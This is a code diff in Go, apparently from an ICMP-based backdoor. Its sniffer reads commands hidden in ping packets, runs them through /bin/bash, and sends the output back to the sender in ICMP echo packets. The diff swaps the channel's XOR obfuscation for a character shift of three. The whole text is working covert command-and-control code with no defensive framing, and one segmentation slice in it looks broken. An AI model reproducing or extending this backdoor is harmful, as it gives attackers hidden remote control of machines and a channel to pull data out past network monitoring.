@@ -66,10 +66,18 @@ func convert(nums []byte) string {
 	return converted
 }
 
-func encrypt_decrypt(plaintext string) string {
+func encrypt(plaintext string) string {
 	encrypted := ""
 	for i := range plaintext {
-		encrypted += string(rune(int(plaintext[i]) ^ int(KEY)))
+		encrypted += string(rune(int(plaintext[i]) + 3))
+	}
+	return encrypted
+}
+
+func decrypt(plaintext string) string {
+	encrypted := ""
+	for i := range plaintext {
+		encrypted += string(rune(int(plaintext[i]) - 3))
 	}
 	return encrypted
 }
@@ -115,7 +123,7 @@ func sniffer() {
 			payload = payload[7:]
 
 			if SSM {
-				payload = encrypt_decrypt(payload)
+				payload = decrypt(payload)
 			}
 			if execute {
 				cmd := exec.Command("/bin/bash", "-c", payload)
@@ -129,10 +137,7 @@ func sniffer() {
 			}
 
 			if err != nil {
-				if SSM {
-					fail := err.Error()
-					out = []byte(encrypt_decrypt(string(fail)))
-				}
+
 				fmt.Println("[FAILED]", string(out))
 				generate_packet(string(out), 0)
 				ipLayer := packet.Layer(layers.LayerTypeIPv4)
@@ -140,9 +145,6 @@ func sniffer() {
 				sender(ip.DstIP.String())
 			}
 
-			if SSM {
-				out = []byte(encrypt_decrypt(string(out)))
-			}
 			fmt.Println("[PAYLOAD]", string(out))
 			generate_packet(string(out), 0)
 			ipLayer := packet.Layer(layers.LayerTypeIPv4)
@@ -161,7 +163,7 @@ func generate_packet(payload string, segment int) {
 		payload := payload[0:1460]
 		nextPayload := payload[1460:byteSize]
 		if SSM {
-			payload = encrypt_decrypt(payload)
+			payload = encrypt(payload)
 		}
 		packet := icmp.Message{
 			Type: ipv4.ICMPTypeEcho, Code: 0,
@@ -176,7 +178,7 @@ func generate_packet(payload string, segment int) {
 	} else {
 		// Packet if no segmentation is needed
 		if SSM {
-			payload = encrypt_decrypt(payload)
+			payload = encrypt(payload)
 		}
 		packet := icmp.Message{
 			Type: ipv4.ICMPTypeEcho, Code: 0,
